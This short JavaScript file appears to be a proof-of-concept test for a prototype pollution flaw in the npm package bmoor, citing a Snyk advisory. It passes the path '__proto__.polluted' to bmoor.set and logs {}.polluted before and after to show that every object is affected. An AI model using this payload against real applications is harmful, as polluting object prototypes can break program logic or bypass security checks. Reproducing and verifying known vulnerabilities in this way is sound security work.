// //https://snyk.io/vuln/SNYK-JS-BMOOR-598664
// test("prototype pollution in bmoor", () => {
console.log({}.polluted);

  const bmoor = require("bmoor");
  bmoor.set({}, "__proto__.polluted", "yes");
  
console.log({}.polluted);
// });
